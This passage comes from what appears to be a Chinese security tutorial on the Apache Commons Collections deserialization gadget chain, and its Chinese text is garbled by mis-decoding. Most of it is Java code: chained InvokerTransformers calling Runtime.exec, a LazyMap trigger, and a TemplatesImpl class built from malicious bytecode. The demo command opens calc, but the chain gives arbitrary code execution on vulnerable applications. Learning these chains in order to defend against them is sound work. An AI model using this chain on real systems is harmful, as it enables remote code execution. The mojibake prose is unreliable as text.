æ–¹æ³•ã€‚å…¶ transform æ–¹æ³•ä½œç”¨æ˜¯åå°„è°ƒç”¨æ„é€ å‡½æ•°å°†ç±»å®ä¾‹åŒ–ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3786388740793356347L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NO_ARG_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//é‡å†™çš„ transform æ–¹æ³•ï¼Œåå°„è°ƒç”¨æ„é€ å‡½æ•°å°†ç±»å®ä¾‹åŒ–ã€‚</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Student ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å­¦ç”Ÿå§“å:&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æµ‹è¯• InstantiateTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;å°æ˜&quot;</span>&#125;);</span><br><span class="line">        instantiateTransformer.transform(Student.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">###è¾“å‡º</span><br><span class="line">å­¦ç”Ÿå§“å:å°æ˜</span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="ChainedTransformer">ChainedTransformer</h3><p>Transformer æ¥å£çš„å®ç°ç±»ï¼Œå¹¶é‡å†™äº†å…¶æ¥å£ç±»çš„ transformer æ–¹æ³•ã€‚å…¶ transform æ–¹æ³•ä½œç”¨æ˜¯å®ç°æ•°ç»„é“¾å¼è°ƒç”¨ã€‚æˆ‘ä»¬åªéœ€ä¼ å…¥ä¸€ä¸ª Transformer[] ç»™ ChainedTransformerï¼Œç„¶åæ‰§è¡Œ ChainedTransformer çš„ transform æ–¹æ³•ä¾¿å¯ä»¥é“¾å¼è°ƒç”¨ Transformer[] ä¸­æ¯ä¸ª Transformer çš„ transform æ–¹æ³•ã€‚å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//é‡å†™çš„ transform æ–¹æ³•ï¼Œé“¾å¼è°ƒç”¨ Transformer[] ä¸­æ¯ä¸ª Transformer çš„ transform</span></span><br><span class="line">    æ–¹æ³•</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demoï¼šï¼ˆ å¾ˆé‡è¦ åˆ©ç”¨ ChainedTransformer å®ç° Runtime.<em>getRuntime</em>().exec(â€œcalcâ€) ï¼‰</p><p>è¿™ä¸ªæ˜¯åå°„è°ƒç”¨execå’Œåˆ©ç”¨Transformerè°ƒç”¨çš„å¯¹æ¯”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="comment">//Method Runtime = c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">Runtime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(c);</span><br><span class="line">        <span class="comment">//Runtime r = (Runtime) Runtime.invoke(null,null);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (java.lang.Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(Runtime);</span><br><span class="line">        <span class="comment">//Method exec = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line">        <span class="comment">//exec.invoke(r,&quot;calc&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ChainedTransformerè¿›è¡Œåˆ©ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="comment">// æµ‹è¯• ChainedTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//Transformeræ•°ç»„</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformerå®ä¾‹</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chain.transform(<span class="string">&quot;test1111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è§¦å‘ ChainedTransformer çš„ transform æ–¹æ³•å‘¢ï¼Ÿè¿™å°±å¼•å‡ºäº† LazyMap ç±»ã€‚</p><h3 id="LazyMapï¼ˆé‡è¦ï¼‰">LazyMapï¼ˆé‡è¦ï¼‰</h3><p>å…¶ get æ–¹æ³•ä¸­å¯ä»¥è§¦å‘ ChainedTransformer çš„ transform æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line">    <span class="comment">//å¯æ§åˆ¶ factory ä¸º ChainedTransformer</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åˆ©ç”¨ get æ–¹æ³•å¯å®ç°è°ƒç”¨ ChainedTransformer#transform()</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line"><span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ‹è¯• ChainedTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//Transformeræ•°ç»„</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformerå®ä¾‹</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//è¿™é‡Œä»€ä¹ˆmapéƒ½è¡Œï¼Œåªè¦ç±»å‹æ˜¯mapå°±è¡Œ</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(map,chain);</span><br><span class="line">        lazy.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###è¾“å‡º</span><br><span class="line">å¼¹å‡ºè®¡ç®—å™¨</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•ååºåˆ—åŒ–æ—¶è§¦å‘ L</p><h3 id="TemplatesImplï¼ˆé‡è¦ï¼‰">TemplatesImplï¼ˆé‡è¦ï¼‰</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//å…³é”®æ–¹æ³•ï¼šnewTransformer()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">            <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"><span class="comment">// å…³é”®ç‚¹ï¼Œè°ƒç”¨ getTransletInstance()</span></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(),</span><br><span class="line">                _outputProperties,</span><br><span class="line">                _indentNumber, _tfactory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ç»§ç»­è·Ÿè¿› getTransletInstance() æ–¹æ³•ï¼š</span></span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">            <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//å…ˆåˆ¤æ–­æ˜¯å¦ä¸º nullï¼Œå¦‚æœä¸º null çš„è¯å»åŠ è½½å­—èŠ‚ç ï¼Œç´§æ¥ç€ newInstance() å¯¹å…¶</span></span><br><span class="line">            å®ä¾‹åŒ–ã€‚</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                    _class[_transletIndex].newInstance();</span><br><span class="line">â€¦â€¦â€¦â€¦</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç»§ç»­è·Ÿè¿› defineTransletClasses() æ–¹æ³•:</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">â€¦â€¦â€¦â€¦</span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span></span><br><span class="line">                            <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">â€¦â€¦â€¦â€¦</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">        _class[i] = loader.defineClass(_bytecodes[i]); <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç»§ç»­è·Ÿè¿› TransletClassLoaderï¼Œè¿™ä¸ªç±»é‡Œé‡å†™äº† defineClass æ–¹æ³•</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length); <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¶æ„å­—èŠ‚ç çš„ç”Ÿæˆï¼š</p><p>HelloTemplatesImpl.javaï¼Œä¸»è¦å…¶å¿…é¡»ç»§æ‰¿ AbstractTranslet ç±»ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloTemplatesImpl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 